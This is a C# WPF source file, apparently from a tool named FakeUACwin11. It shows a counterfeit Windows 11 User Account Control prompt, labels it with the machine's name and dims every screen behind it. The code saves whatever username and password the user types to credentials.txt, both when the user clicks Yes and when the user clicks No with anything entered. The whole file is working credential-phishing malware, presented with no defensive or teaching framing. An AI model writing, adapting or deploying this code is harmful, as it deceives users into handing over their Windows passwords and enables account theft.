using System.IO;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace FakeUACwin11;

/// <summary>
/// Interaction logic for MainWindow.xaml
/// </summary>
public partial class MainWindow : Window
{
    private List<Background> backgrounds = new List<Background>();
    
    public MainWindow()
    {
        this.Resources.Add("PermissionDomain", "Domaine : " + Environment.MachineName);
        InitializeComponent();

        foreach (Screen targetScreen in Screen.AllScreens)
        {
            Background background = new Background(targetScreen);
            background.Show();
            backgrounds.Add(background);
        }
    }
    
    void Win_Click(object sender, RoutedEventArgs e)
    {
        Keyboard.ClearFocus();
        Keyboard.Focus(YesButton);
    }
    
    private void SaveDataToFile()
    {
        string path = @".\credentials.txt";
        // This text is added only once to the file.
        if (!File.Exists(path))
        {
            // Create a file to write to.
            using (StreamWriter sw = File.CreateText(path))
            {
                sw.WriteLine("LOGIN:PASSWORD");
            }
        }

        // This text is always added, making the file longer over time
        // if it is not deleted.
        using (StreamWriter sw = File.AppendText(path))
        {
            sw.WriteLine(Username.Text + ":" + Password.Password);
        }
    }

    void CloseButton_Click(object sender, RoutedEventArgs e)
    {
        CloseWindow();
    }

    void YesButton_Click(Object sender, RoutedEventArgs e)
    {
        SaveDataToFile();
        CloseWindow();
    }

    void NoButton_Click(object sender, RoutedEventArgs e)
    {
        if(Username.Text.Length > 0 || Password.Password.Length > 0) {
            SaveDataToFile();
        }
        CloseWindow();
    }

    private void CloseWindow()
    {
        foreach (Background background in backgrounds)
        {
            background.Close();
        }
        this.Close();
    }
}